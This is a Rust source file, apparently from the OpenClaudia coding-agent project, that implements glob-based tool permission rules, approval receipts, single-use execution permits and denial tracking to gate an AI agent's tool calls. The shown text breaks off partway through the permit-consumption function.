//! Granular tool permission system for `OpenClaudia`.
//!
//! Provides glob-pattern-based permission rules that control tool execution:
//! - Per-tool rules with glob patterns matching commands or file paths
//! - Three compatibility rule decisions: Allow, Deny, and `AlwaysAllow`
//! - Tool-scoped defaults plus exact receipts in trusted per-user state
//!
//! Every call is classified first. Unclassifiable calls deny; classified calls
//! then pass through hard safety, explicit denials, effect policy, scoped
//! approvals, and finally the caller's prompt/default-deny behavior.

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{LazyLock, Mutex};
use tracing::{debug, info, warn};

mod receipts;
pub(crate) use receipts::{approval_workspace_digest, HostApprovalEvidence};
use receipts::{digest_text, ApprovalStore};
pub use receipts::{
    inspect_permission_store, trusted_permission_store_path, ApprovalBinding, ApprovalProvenance,
    ConsumedExecutionPermit, ExecutionPermit, LocalApprovalCache, LocalApprovalDecision,
    PermissionStoreSummary, APPROVAL_RECEIPT_SCHEMA_VERSION,
};

/// Global cache for compiled glob-to-regex patterns.
/// Avoids recompiling the same glob pattern into a `Regex` on every permission check.
static GLOB_CACHE: LazyLock<Mutex<HashMap<String, Regex>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

/// Decision for a permission check
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PermissionDecision {
    /// Allow this specific invocation
    Allow,
    /// Deny this specific invocation
    Deny,
    /// Reuse this pattern for the current in-memory policy scope.
    ///
    /// Durable approval authority is represented by exact, expiring approval
    /// receipts instead of serializing this broad compatibility rule.
    AlwaysAllow,
}

/// A single permission rule mapping a tool + pattern to a decision
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PermissionRule {
    /// Tool name: "Bash", "Edit", "Write", etc.
    pub tool: String,
    /// Glob-style pattern matched against the tool's primary argument.
    /// For Bash: matched against the command string.
    /// For Edit/Write: matched against the canonicalized `path` target.
    pub pattern: String,
    /// The decision to apply when this rule matches.
    pub decision: PermissionDecision,
}

/// Convert Claude-compatible `allowed-tools` entries into permission allow rules.
///
/// Entries that name read-only tools, unknown tools, or malformed scopes are
/// ignored because they do not correspond to an `OpenClaudia` permission target.
/// The returned rules are intended for turn-scoped pre-approval, not for
/// broadening persisted user configuration.
#[must_use]
pub fn allowed_tool_specs_to_permission_rules(specs: Option<&[String]>) -> Vec<PermissionRule> {
    specs
        .into_iter()
        .flatten()
        .filter_map(|spec| allowed_tool_spec_to_permission_rule(spec))
        .collect()
}

fn allowed_tool_spec_to_permission_rule(spec: &str) -> Option<PermissionRule> {
    let spec = spec.trim();
    if spec.is_empty() {
        return None;
    }

    let (tool, pattern) = parse_allowed_tool_spec(spec);
    let canonical = canonical_permission_tool(tool)?;
    let pattern = pattern
        .map(|p| {
            if canonical == "Bash" {
                normalize_bash_allowed_tool_pattern(p)
            } else {
                p.trim().to_string()
            }
        })
        .filter(|p| !p.is_empty())
        .unwrap_or_else(|| "**".to_string());

    Some(PermissionRule {
        tool: canonical.to_string(),
        pattern,
        decision: PermissionDecision::Allow,
    })
}

fn parse_allowed_tool_spec(spec: &str) -> (&str, Option<&str>) {
    let Some(open) = spec.find('(') else {
        return (spec.trim(), None);
    };
    if !spec.ends_with(')') || open == 0 {
        return (spec.trim(), None);
    }

    let tool = spec[..open].trim();
    let pattern = spec[open + 1..spec.len() - 1].trim();
    (tool, Some(pattern))
}

fn parse_default_policy_rule(configured: &str) -> (Option<&'static str>, &str) {
    let (tool, pattern) = parse_allowed_tool_spec(configured);
    match pattern {
        Some(pattern) if !pattern.is_empty() => {
            let canonical = canonical_permission_tool(tool)
                .or_else(|| crate::tools::effect::lookup(tool).map(|(_, spec)| spec.canonical));
            canonical.map_or((None, configured), |tool| (Some(tool), pattern))
        }
        _ => (None, configured),
    }
}

fn canonical_permission_tool(tool: &str) -> Option<&'static str> {
    let normalized: String = tool
        .chars()
        .filter(|c| *c != '_' && *c != '-')
        .flat_map(char::to_lowercase)
        .collect();

    match normalized.as_str() {
        "bash" | "shell" => Some("Bash"),
        "write" | "writefile" => Some("Write"),
        "edit" | "editfile" | "multiedit" | "notebookedit" => Some("Edit"),
        "webfetch" => Some("WebFetch"),
        _ => None,
    }
}

fn normalize_bash_allowed_tool_pattern(pattern: &str) -> String {
    let pattern = pattern.trim();
    if !pattern.contains("://") {
        if let Some((command, args)) = pattern.split_once(':') {
            if !command.trim().is_empty() && !args.trim().is_empty() {
                return format!("{} {}", command.trim_end(), args.trim_start());
            }
        }
    }
    pattern.to_string()
}

/// Split an `allowed-tools` scalar while preserving spaces inside tool scopes.
///
/// Supports both current Claude-style whitespace-separated strings such as
/// `Bash(git add *) Bash(git status *)` and legacy comma-separated strings.
#[must_use]
pub fn split_allowed_tool_specs_scalar(s: &str) -> Vec<String> {
    let mut specs = Vec::new();
    let mut start = 0usize;
    let mut paren_depth = 0u32;

    for (idx, ch) in s.char_indices() {
        match ch {
            '(' => paren_depth = paren_depth.saturating_add(1),
            ')' => paren_depth = paren_depth.saturating_sub(1),
            ',' if paren_depth == 0 => {
                push_tool_spec(&mut specs, &s[start..idx]);
                start = idx + ch.len_utf8();
            }
            ch if ch.is_whitespace() && paren_depth == 0 => {
                push_tool_spec(&mut specs, &s[start..idx]);
                start = idx + ch.len_utf8();
            }
            _ => {}
        }
    }
    push_tool_spec(&mut specs, &s[start..]);
    specs
}

fn push_tool_spec(out: &mut Vec<String>, raw: &str) {
    let trimmed = raw.trim();
    if !trimmed.is_empty() {
        out.push(trimmed.to_string());
    }
}

/// Result of a permission check
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CheckResult {
    /// Tool use is allowed
    Allowed,
    /// Tool use is denied
    Denied(String),
    /// No rule matched; the caller should prompt the user
    NeedsPrompt { tool: String, target: String },
}

/// Call-bound authorization result used by interactive frontends.
///
/// An allowed result carries an opaque, single-use permit. The permit is the
/// only way an outer prompt may authorize unchecked execution; callers cannot
/// replace it with a Boolean or serialize it into session state.
#[derive(Debug)]
pub enum AuthorizationResult {
    /// The exact invocation may proceed once.
    Allowed(ExecutionPermit),
    /// Hard policy or an explicit denial rejected the invocation.
    Denied(String),
    /// No approval or policy default matched; the caller must ask the user.
    NeedsPrompt { tool: String, target: String },
}

fn parse_tool_call_arguments(
    tool_call: &crate::tools::ToolCall,
) -> Result<serde_json::Value, String> {
    let value = serde_json::from_str::<serde_json::Value>(&tool_call.function.arguments).map_err(
        |error| {
            format!(
                "Invalid tool arguments JSON for '{}': {error}",
                tool_call.function.name
            )
        },
    )?;
    if value.is_object() {
        Ok(value)
    } else {
        Err(format!(
            "Invalid tool arguments JSON for '{}': expected an object",
            tool_call.function.name
        ))
    }
}

/// Maximum number of *consecutive* denials before the agent should abort.
///
/// Parity target: CC `denialTracking.ts` `DENIAL_LIMITS.maxConsecutive`.
/// CC uses 3; OC uses 5 (configured via crosslink #572) to be slightly
/// more permissive of transient prompt-fallback churn before escalation.
pub const MAX_CONSECUTIVE_DENIALS: u32 = 5;

/// Maximum number of *total* (session-cumulative) denials before the agent
/// should abort. Parity target: CC `denialTracking.ts` `DENIAL_LIMITS.maxTotal` (20).
pub const MAX_TOTAL_DENIALS: u32 = 20;

/// Whether the denial-tracking state has crossed an escalation threshold.
///
/// Callers (notably the headless agent loop) should query
/// [`PermissionManager::escalation_state`] after each denial and abort the
/// agent cleanly when [`EscalationState::ShouldAbort`] is returned. Parity
/// target: CC `shouldFallbackToPrompting()` in
/// `utils/permissions/denialTracking.ts`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EscalationState {
    /// Counters are below both thresholds; no escalation needed.
    Normal,
    /// Either the consecutive or total denial threshold has been exceeded;
    /// the caller should abort (headless mode) or fall back to interactive
    /// prompting (interactive mode).
    ShouldAbort,
}

/// Typed auto-allow score for `(tool_name, args)` (S-020; F-045).
///
/// This compatibility API deliberately has only two outcomes. A concrete
/// invocation that resolves through the mandatory tool registry to
/// [`crate::tools::effect::ToolEffect::ReadOnly`] scores `1.0`; every
/// effectful, malformed, or unknown invocation scores `0.0`. In particular,
/// arbitrary Bash text is never parsed or guessed into a read-only effect.
/// Callers that need filesystem inspection should use the typed `read_file`,
/// `list_files`, `glob`, or `grep` tools instead of a shell string.
#[must_use]
pub fn auto_allow_score(tool_name: &str, tool_args: &serde_json::Value) -> f32 {
    // S-016/F-001: an unclassifiable call scores 0.0, not 1.0. Previously an
    // unknown tool — or any registered handler that had not overridden
    // `permission_target` — returned `None` here and was scored as
    // unconditionally safe, which is the fail-open the finding records.
    let Ok(resolved) = crate::tools::effect::resolve_for_call(tool_name, tool_args) else {
        return 0.0;
    };

    if resolved.effect.requires_authorization() {
        0.0
    } else {
        1.0
    }
}

/// Denial-tracking newtype — crosslink #577.
///
/// Lifts the `consecutive_denials` / `total_denials` pair out of
/// [`PermissionManager`] into a standalone struct that mirrors CC
/// `denialTracking.ts`. The manager retains its own counters for
/// backward-compatible access but a `DenialTracker` can also live
/// outside the manager — e.g. shared across multiple permission
/// strategies in the same session.
///
/// Two thresholds are tracked:
///   * `consecutive` — resets to zero on any allowed outcome.
///   * `total` — never resets within a session.
///
/// Default limits mirror [`MAX_CONSECUTIVE_DENIALS`] and
/// [`MAX_TOTAL_DENIALS`]. Use [`DenialTracker::with_limits`] for a
/// custom threshold.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct DenialTracker {
    consecutive: u32,
    total: u32,
    limits: DenialLimits,
}

/// Threshold limits for [`DenialTracker`] (crosslink #577).
///
/// Parity target: CC `DENIAL_LIMITS` in `denialTracking.ts`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct DenialLimits {
    /// Maximum consecutive denials before escalation.
    pub max_consecutive: u32,
    /// Maximum total (session-cumulative) denials before escalation.
    pub max_total: u32,
}

impl Default for DenialLimits {
    fn default() -> Self {
        Self {
            max_consecutive: MAX_CONSECUTIVE_DENIALS,
            max_total: MAX_TOTAL_DENIALS,
        }
    }
}

impl DenialTracker {
    /// Construct a tracker with the default OC limits.
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    /// Construct a tracker with explicit limits.
    #[must_use]
    pub const fn with_limits(limits: DenialLimits) -> Self {
        Self {
            consecutive: 0,
            total: 0,
            limits,
        }
    }

    /// Record a denial — increments both counters (saturating).
    /// Parity: CC `recordDenial`.
    pub const fn record_denial(&mut self) {
        self.consecutive = self.consecutive.saturating_add(1);
        self.total = self.total.saturating_add(1);
    }

    /// Record an allowed outcome — resets the consecutive counter.
    /// Parity: CC `recordSuccess`.
    pub const fn record_allowed(&mut self) {
        self.consecutive = 0;
    }

    /// Reset both counters (e.g. on session restart).
    pub const fn reset(&mut self) {
        self.consecutive = 0;
        self.total = 0;
    }

    /// Current consecutive-denial count.
    #[must_use]
    pub const fn consecutive(&self) -> u32 {
        self.consecutive
    }

    /// Current total-denial count.
    #[must_use]
    pub const fn total(&self) -> u32 {
        self.total
    }

    /// Configured limits.
    #[must_use]
    pub const fn limits(&self) -> DenialLimits {
        self.limits
    }

    /// Current escalation state. Parity: CC `shouldFallbackToPrompting`.
    #[must_use]
    pub const fn escalation_state(&self) -> EscalationState {
        if self.consecutive > self.limits.max_consecutive || self.total > self.limits.max_total {
            EscalationState::ShouldAbort
        } else {
            EscalationState::Normal
        }
    }
}

/// Runtime context the permission system is being consulted from
/// (crosslink #570).
///
/// CC dispatches permission resolution to three distinct handlers based
/// on where the agent is running:
///   * `interactiveHandler.ts` (main interactive agent) — UI prompt.
///   * `swarmWorkerHandler.ts` — forward to leader / silent default-deny.
///   * `coordinatorHandler.ts` — sequential hook-then-classifier with
///     fall-through to interactive.
///
/// OC `PermissionManager::check` historically returned a single
/// `NeedsPrompt` and let callers re-interpret it — the TUI prompted, the
/// REPL prompted, and the headless coordinator would silently deny by
/// timing out. This conflation is the bug #570 closes: callers now pass
/// a `PermissionContext` so the *manager* projects the unmatched-rule
/// state into a context-appropriate `CheckResult` variant.
///
/// Variants:
///   * [`PermissionContext::Interactive`] — TUI / REPL. Unmatched rules
///     surface as [`CheckResult::NeedsPrompt`] (caller prompts the user).
///   * [`PermissionContext::SwarmWorker`] — background subagent / swarm
///     follower. Unmatched rules surface as [`CheckResult::Denied`] with
///     a *non-interactive default-deny* reason — the caller cannot
///     prompt. Parity: CC `swarmWorkerHandler` returning null after the
///     mailbox path is unavailable.
///   * [`PermissionContext::Coordinator`] — headless leader / scheduler.
///     Same default-deny posture as `SwarmWorker` for the moment; this
///     variant exists so a future coordinator-relay (#619) can plug in
///     without breaking the API.
///
/// Read-only tools and explicit allow/deny rules behave identically
/// across all contexts. Only the fall-through (no rule matched) branch
/// is context-sensitive.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum PermissionContext {
    /// Default: TUI / REPL / chat — caller can prompt the user.
    #[default]
    Interactive,
    /// Background subagent / swarm worker — no UI available, default-deny.
    SwarmWorker,
    /// Headless coordinator / scheduled run — no UI, default-deny.
    /// Reserved for future coordinator-relay; today behaves like `SwarmWorker`.
    Coordinator,
}

/// Manages permission rules for tool execution.
///
/// Rules are checked in priority order:
/// 1. Current explicit deny rules
/// 2. Exact, unexpired approval receipts
/// 3. Effect-level policy (read-only/session-local defaults)
/// 4. Tool-scoped config policy and compatibility session rules
/// 5. If nothing matches, returns `NeedsPrompt`
pub struct PermissionManager {
    /// Persisted explicit denials loaded from trusted host state. Legacy broad
    /// allows are deliberately not migrated because they cannot be narrowed
    /// without inventing actor/resource/generation scope.
    persisted_rules: Vec<PermissionRule>,
    /// Transient session rules (Allow/Deny added during this session)
    session_rules: Vec<PermissionRule>,
    /// Default allow patterns from config
    default_allow: Vec<String>,
    /// `WebFetch` hosts that bypass the interactive prompt.
    web_fetch_preapproved_domains: Vec<String>,
    /// Exact reusable approvals, exact denials, and capability generation.
    approval_store: ApprovalStore,
    /// Whether the permission system is enabled
    enabled: bool,
    /// Consecutive denial counter — resets to 0 on any allowed outcome.
    /// Parity: CC `DenialTrackingState.consecutiveDenials`.
    consecutive_denials: u32,
    /// Total denial counter — never resets within a session.
    /// Parity: CC `DenialTrackingState.totalDenials`.
    total_denials: u32,
}

struct UnrestrictedSafetyDenial {
    reason: String,
    target: String,
}

impl PermissionManager {
    /// Create a new `PermissionManager`, loading persisted rules from disk.
    pub fn new(
        persist_path: impl Into<PathBuf>,
        enabled: bool,
        default_allow: Vec<String>,
    ) -> Self {
        Self::new_with_web_fetch_preapproved(
            persist_path,
            enabled,
            default_allow,
            crate::config::default_preapproved_domains(),
        )
    }

    /// Create a new `PermissionManager` with an explicit `web_fetch`
    /// preapproved-domain catalog.
    ///
    /// Passing an empty list disables the `web_fetch` prompt bypass while
    /// keeping the rest of the permission system unchanged.
    pub fn new_with_web_fetch_preapproved(
        persist_path: impl Into<PathBuf>,
        enabled: bool,
        default_allow: Vec<String>,
        web_fetch_preapproved_domains: Vec<String>,
    ) -> Self {
        Self::new_with_binding_and_web_fetch_preapproved(
            persist_path,
            enabled,
            default_allow,
            web_fetch_preapproved_domains,
            ApprovalBinding::current(),
        )
    }

    /// Create a manager with an explicit actor/workspace binding.
    ///
    /// Production composition roots normally use [`Self::trusted`]. This
    /// constructor exists for hosts that already own an authenticated binding
    /// and for deterministic receipt tests.
    pub fn new_with_binding_and_web_fetch_preapproved(
        persist_path: impl Into<PathBuf>,
        enabled: bool,
        default_allow: Vec<String>,
        web_fetch_preapproved_domains: Vec<String>,
        binding: ApprovalBinding,
    ) -> Self {
        let approval_store = ApprovalStore::load(persist_path.into(), binding);
        let persisted_rules = approval_store.persisted_denials();

        // Pre-validate default_allow patterns at load time so invalid globs fail fast
        for configured in &default_allow {
            let (_, pattern) = parse_default_policy_rule(configured);
            if Self::glob_to_regex_cached(pattern).is_none() {
                warn!(
                    pattern_digest = %digest_text(pattern),
                    "Invalid default_allow glob pattern will never match"
                );
            }
        }

        Self {
            persisted_rules,
            session_rules: Vec::new(),
            default_allow,
            web_fetch_preapproved_domains,
            approval_store,
            enabled,
            consecutive_denials: 0,
            total_denials: 0,
        }
    }

    /// Construct a production manager rooted in trusted per-user host state.
    #[must_use]
    pub fn trusted(
        enabled: bool,
        default_allow: Vec<String>,
        web_fetch_preapproved_domains: Vec<String>,
    ) -> Self {
        Self::new_with_web_fetch_preapproved(
            trusted_permission_store_path(),
            enabled,
            default_allow,
            web_fetch_preapproved_domains,
        )
    }

    /// Construct a production manager bound to one exact run generation.
    #[must_use]
    pub fn trusted_for_run(
        run: &crate::tools::ToolRunContext,
        enabled: bool,
        default_allow: Vec<String>,
        web_fetch_preapproved_domains: Vec<String>,
    ) -> Self {
        Self::new_with_binding_and_web_fetch_preapproved(
            trusted_permission_store_path(),
            enabled,
            default_allow,
            web_fetch_preapproved_domains,
            ApprovalBinding::for_run(run),
        )
    }

    /// Build an explicitly unrestricted manager that skips prompts and rules.
    ///
    /// Classification and hard safety checks still apply: unknown tools,
    /// malformed typed operations, catastrophic bash commands, dangerous
    /// shell constructs, prompt-injected sandbox escalation, and writes to
    /// protected control files are denied before the `enabled=false` shortcut
    /// fires.
    ///
    /// This is the migration target for call sites that previously passed
    /// `None` through `Option<&PermissionManager>`: the new strict dispatch
    /// entry points demand a concrete manager, and constructing
    /// `PermissionManager::unrestricted()` documents the intent ("allow
    /// everything") at the call site rather than smuggling it in via a
    /// missing argument. See crosslink #460.
    #[must_use]
    pub fn unrestricted() -> Self {
        // `enabled = false` suppresses user rules/prompts after mandatory
        // effect classification and hard safety have both run.
        Self {
            persisted_rules: Vec::new(),
            session_rules: Vec::new(),
            default_allow: Vec::new(),
            web_fetch_preapproved_domains: Vec::new(),
            approval_store: ApprovalStore::empty(ApprovalBinding::current()),
            enabled: false,
            consecutive_denials: 0,
            total_denials: 0,
        }
    }

    /// Build an unrestricted manager whose receipt identity is still bound to
    /// one exact run. Mandatory host-safety gates remain active.
    #[must_use]
    pub fn unrestricted_for_run(run: &crate::tools::ToolRunContext) -> Self {
        Self {
            persisted_rules: Vec::new(),
            session_rules: Vec::new(),
            default_allow: Vec::new(),
            web_fetch_preapproved_domains: Vec::new(),
            approval_store: ApprovalStore::empty(ApprovalBinding::for_run(run)),
            enabled: false,
            consecutive_denials: 0,
            total_denials: 0,
        }
    }

    fn classify_for_policy(
        tool_name: &str,
        tool_args: &serde_json::Value,
    ) -> Result<crate::tools::effect::ResolvedEffect, CheckResult> {
        crate::tools::host_safety::HostSafetyPolicy::enforce(tool_name, tool_args).map_err(
            |reason| {
                warn!(tool = %tool_name, "Host safety denied tool invocation");
                CheckResult::Denied(format!("Host safety: {reason}"))
            },
        )
    }

    fn matching_explicit_deny<'a>(
        &'a self,
        canonical_tool: &str,
        target: &str,
    ) -> Option<&'a PermissionRule> {
        self.session_rules
            .iter()
            .chain(self.persisted_rules.iter())
            .find(|rule| {
                rule.decision == PermissionDecision::Deny
                    && Self::rule_matches(rule, canonical_tool, target)
            })
    }

    fn classify_after_non_bypassable_denials(
        &self,
        tool_name: &str,
        tool_args: &serde_json::Value,
        session_id: Option<&str>,
    ) -> Result<crate::tools::effect::ResolvedEffect, CheckResult> {
        let resolved = Self::classify_for_policy(tool_name, tool_args)?;

        if !self.enabled {
            if let Some(denial) =
                Self::unrestricted_bash_construct_hard_safety_denial(tool_name, tool_args)
            {
                Self::log_permission_decision(
                    "denied",
                    "unrestricted_hard_safety",
                    tool_name,
                    &denial.target,
                    "",
                );
                return Err(CheckResult::Denied(denial.reason));
            }
        }

        if let Some(rule) = self.matching_explicit_deny(&resolved.canonical, &resolved.target) {
            Self::log_permission_decision(
                "denied",
                "explicit_deny_rule",
                &resolved.canonical,
                &resolved.target,
                &rule.pattern,
            );
            return Err(CheckResult::Denied(format!(
                "Denied by rule: {} on pattern '{}'",
                resolved.canonical, rule.pattern
            )));
        }

        let scope = self
            .approval_store
            .scope_for(&resolved, tool_args, session_id);
        if self.approval_store.exact_denial_matches(&scope) {
            Self::log_permission_decision(
                "denied",
                "exact_denial_receipt",
                &resolved.canonical,
                &resolved.target,
                "",
            );
            return Err(CheckResult::Denied(format!(
                "Denied by exact approval-scope denial for {}",
                resolved.canonical
            )));
        }

        Ok(resolved)
    }

    fn policy_default_outcome(
        &self,
        resolved: crate::tools::effect::ResolvedEffect,
        transient_allow_rules: &[PermissionRule],
    ) -> CheckResult {
        let canonical_tool = resolved.canonical;
        let target = resolved.target;

        if !self.enabled {
            Self::log_permission_decision(
                "allowed",
                "explicit_unrestricted_policy",
                &canonical_tool,
                &target,
                "",
            );
            return CheckResult::Allowed;
        }

        if !resolved.effect.requires_authorization() {
            return CheckResult::Allowed;
        }

        if resolved.effect == crate::tools::effect::ToolEffect::SessionMutation {
            Self::log_permission_decision(
                "allowed",
                "session_mutation_default",
                &canonical_tool,
                &target,
                "",
            );
            return CheckResult::Allowed;
        }

        // Session Allow rules are compatibility policy inputs, not approval
        // receipts. They remain below every denial and exact receipt.
        for rule in &self.session_rules {
            if matches!(
                rule.decision,
                PermissionDecision::Allow | PermissionDecision::AlwaysAllow
            ) && Self::rule_matches(rule, &canonical_tool, &target)
            {
                Self::log_permission_decision(
                    "allowed",
                    "session_policy_rule",
                    &canonical_tool,
                    &target,
                    &rule.pattern,
                );
                return CheckResult::Allowed;
            }
        }

        for rule in transient_allow_rules {
            if matches!(
                rule.decision,
                PermissionDecision::Allow | PermissionDecision::AlwaysAllow
            ) && Self::rule_matches(rule, &canonical_tool, &target)
            {
                Self::log_permission_decision(
                    "allowed",
                    "transient_allow_policy",
                    &canonical_tool,
                    &target,
                    &rule.pattern,
                );
                return CheckResult::Allowed;
            }
        }

        if self.web_fetch_preapproved_allowed(&canonical_tool, &target) {
            return CheckResult::Allowed;
        }

        // Legacy unqualified config entries are constrained to Bash. New
        // entries can name an exact canonical tool as `Tool(pattern)`.
        for configured in &self.default_allow {
            let (tool_scope, pattern) = parse_default_policy_rule(configured);
            let tool_matches =
                tool_scope.map_or_else(|| canonical_tool == "Bash", |tool| tool == canonical_tool);
            if tool_matches && Self::glob_matches(pattern, &target) {
                Self::log_permission_decision(
                    "allowed",
                    "default_allow_config",
                    &canonical_tool,
                    &target,
                    pattern,
                );
                return CheckResult::Allowed;
            }
        }

        CheckResult::NeedsPrompt {
            tool: canonical_tool,
            target,
        }
    }

    /// Check whether policy alone allows a tool invocation.
    ///
    /// - `tool_name`: e.g. "bash", "`edit_file`", "`write_file`"
    /// - `tool_args`: the parsed arguments map from the tool call
    ///
    /// Returns `Allowed`, `Denied`, or `NeedsPrompt`. This legacy projection
    /// deliberately does not inspect or consume approval receipts because it
    /// cannot return the execution permit required at dispatch. Callers that
    /// need receipt-aware authorization must use [`Self::authorize_tool_call`].
    pub fn check(&self, tool_name: &str, tool_args: &serde_json::Value) -> CheckResult {
        let resolved = match self.classify_after_non_bypassable_denials(tool_name, tool_args, None)
        {
            Ok(resolved) => resolved,
            Err(denied) => return denied,
        };
        self.policy_default_outcome(resolved, &[])
    }

    /// Check a tool invocation with additional turn-scoped allow rules.
    ///
    /// This is used by slash-command / skill metadata such as
    /// `allowed-tools`: the extra rules can pre-approve matching calls for
    /// the current prompt, but they never override hard safety checks or
    /// explicit deny rules already present in the manager.
    pub fn check_with_transient_allow_rules(
        &self,
        tool_name: &str,
        tool_args: &serde_json::Value,
        transient_allow_rules: &[PermissionRule],
    ) -> CheckResult {
        let resolved = match self.classify_after_non_bypassable_denials(tool_name, tool_args, None)
        {
            Ok(resolved) => resolved,
            Err(denied) => return denied,
        };
        self.policy_default_outcome(resolved, transient_allow_rules)
    }

    /// Authorize one exact tool call and return an opaque one-use permit.
    ///
    /// Precedence is deterministic: hard safety, broad and exact explicit
    /// denials, an exact reusable approval receipt, then policy defaults. A
    /// receipt is consumed before the permit is returned and the executor
    /// independently consumes that permit before dispatch.
    pub fn authorize_tool_call(
        &self,
        tool_call: &crate::tools::ToolCall,
        session_id: Option<&str>,
    ) -> AuthorizationResult {
        self.authorize_tool_call_with_transient_rules(tool_call, session_id, &[])
    }

    /// Receipt-aware authorization with additional turn-scoped policy rules.
    pub fn authorize_tool_call_with_transient_rules(
        &self,
        tool_call: &crate::tools::ToolCall,
        session_id: Option<&str>,
        transient_allow_rules: &[PermissionRule],
    ) -> AuthorizationResult {
        let arguments = match parse_tool_call_arguments(tool_call) {
            Ok(arguments) => arguments,
            Err(reason) => return AuthorizationResult::Denied(reason),
        };
        let resolved = match self.classify_after_non_bypassable_denials(
            &tool_call.function.name,
            &arguments,
            session_id,
        ) {
            Ok(resolved) => resolved,
            Err(CheckResult::Denied(reason)) => return AuthorizationResult::Denied(reason),
            Err(other) => {
                return AuthorizationResult::Denied(format!(
                    "permission denial classifier returned an invalid outcome: {other:?}"
                ));
            }
        };
        let scope = self
            .approval_store
            .scope_for(&resolved, &arguments, session_id);
        if resolved.canonical == "MemoryReview" {
            return AuthorizationResult::NeedsPrompt {
                tool: resolved.canonical,
                target: resolved.target,
            };
        }
        match self.approval_store.take_approval(&scope, &tool_call.id) {
            Ok(Some(permit)) => {
                Self::log_permission_decision(
                    "allowed",
                    "scoped_approval_receipt",
                    &resolved.canonical,
                    &resolved.target,
                    "",
                );
                return AuthorizationResult::Allowed(permit);
            }
            Ok(None) => {}
            Err(error) => {
                return AuthorizationResult::Denied(format!(
                    "Permission approval store could not consume a receipt: {error}"
                ));
            }
        }

        match self.policy_default_outcome(resolved, transient_allow_rules) {
            CheckResult::Allowed => AuthorizationResult::Allowed(self.approval_store.mint_once(
                scope,
                &tool_call.id,
                ApprovalProvenance::PolicyEvaluation,
            )),
            CheckResult::Denied(reason) => AuthorizationResult::Denied(reason),
            CheckResult::NeedsPrompt { tool, target } => {
                AuthorizationResult::NeedsPrompt { tool, target }
            }
        }
    }

    /// Grant the current exact call once after an interactive decision.
    ///
    /// # Errors
    ///
    /// Returns an error when the call is malformed, unclassified, explicitly
    /// denied, or the persisted capability generation cannot be synchronized.
    pub fn approve_tool_call_once(
        &self,
        tool_call: &crate::tools::ToolCall,
        session_id: Option<&str>,
        provenance: ApprovalProvenance,
    ) -> Result<ExecutionPermit, String> {
        let (arguments, resolved, scope) = self.approvable_scope(tool_call, session_id)?;
        let _ = arguments;
        if resolved.canonical == "MemoryReview"
            && !matches!(
                provenance,
                ApprovalProvenance::InteractiveUser
                    | ApprovalProvenance::AcpClient
                    | ApprovalProvenance::HostAdministrator
            )
        {
            return Err(
                "technical-memory review requires a one-use authenticated host decision"
                    .to_string(),
            );
        }
        Self::log_permission_decision(
            "allowed",
            "one_use_approval",
            &resolved.canonical,
            &resolved.target,
            "",
        );
        Ok(self
            .approval_store
            .mint_once(scope, &tool_call.id, provenance))
    }

    /// Grant repeated use of this exact normalized invocation for the current
    /// session, bounded to eight hours and 128 total uses.
    ///
    /// # Errors
    ///
    /// Returns an error when the call is malformed, unclassified, explicitly
    /// denied, or the persisted capability generation cannot be synchronized.
    pub fn approve_tool_call_for_session(
        &self,
        tool_call: &crate::tools::ToolCall,
        session_id: &str,
        provenance: ApprovalProvenance,
    ) -> Result<ExecutionPermit, String> {
        let (_arguments, resolved, scope) = self.approvable_scope(tool_call, Some(session_id))?;
        if resolved.canonical == "MemoryReview" {
            return Err(
                "technical-memory review cannot use a reusable session approval".to_string(),
            );
        }
        let permit = self
            .approval_store
            .approve_for_session(scope, &tool_call.id, provenance);
        Self::log_permission_decision(
            "allowed",
            "session_approval_receipt",
            &resolved.canonical,
            &resolved.target,
            "",
        );
        Ok(permit)
    }

    /// Persist repeated use of this exact normalized invocation in the trusted
    /// host store, bounded to 30 days and 64 total uses.
    ///
    /// # Errors
    ///
    /// Returns an error when authorization is invalid or denied, when the
    /// trusted store cannot be locked or written, or when its generation
    /// changed while approval was in flight.
    pub fn approve_tool_call_persisted(
        &self,
        tool_call: &crate::tools::ToolCall,
        session_id: Option<&str>,
        provenance: ApprovalProvenance,
    ) -> Result<ExecutionPermit, String> {
        let (_arguments, resolved, scope) = self.approvable_scope(tool_call, session_id)?;
        if resolved.canonical == "MemoryReview" {
            return Err("technical-memory review cannot use a persisted approval".to_string());
        }
        let permit = self
            .approval_store
            .approve_persisted(scope, &tool_call.id, provenance)?;
        Self::log_permission_decision(
            "allowed",
            "persisted_approval_receipt",
            &resolved.canonical,
            &resolved.target,
            "",
        );
        Ok(permit)
    }

    /// Record an exact session denial and rotate the capability generation so
    /// every permit/approval minted before the denial becomes unusable.
    ///
    /// # Errors
    ///
    /// Returns an error when the call cannot be classified or the generation
    /// rotation cannot be written to trusted state. The in-memory denial is
    /// still retained when a persistence write fails.
    pub fn deny_tool_call_for_session(
        &self,
        tool_call: &crate::tools::ToolCall,
        session_id: &str,
        provenance: ApprovalProvenance,
    ) -> Result<(), String> {
        let arguments = parse_tool_call_arguments(tool_call)?;
        let resolved = Self::classify_for_policy(&tool_call.function.name, &arguments)
            .map_err(|outcome| format!("{outcome:?}"))?;
        let scope = self
            .approval_store
            .scope_for(&resolved, &arguments, Some(session_id));
        self.approval_store.add_session_denial(scope, provenance)?;
        Self::log_permission_decision(
            "denied",
            "exact_session_denial",
            &resolved.canonical,
            &resolved.target,
            "",
        );
        Ok(())
    }

    /// Revalidate and atomically consume a call-bound execution permit.
    ///
    /// The denial pipeline runs again at dispatch time. Consequently a permit
    /// cannot race a later denial or a capability-generation rotation.
    ///
    /// # Errors
    ///
    /// Returns an error when trusted-state synchronization fails, the permit
    /// is expired, stale, already used, or bound to a different exact call, or
    /// a current denial rejects the invocation.
    pub fn consume_execution_permit(
        &self,
        permit: &ExecutionPermit,
        tool_call: &crate::tools::ToolCall,
        session_id: Option<&str>,
    ) -> Result<ConsumedExecutionPermit, String> {
        if !permit.matches_call_id(tool_call) {
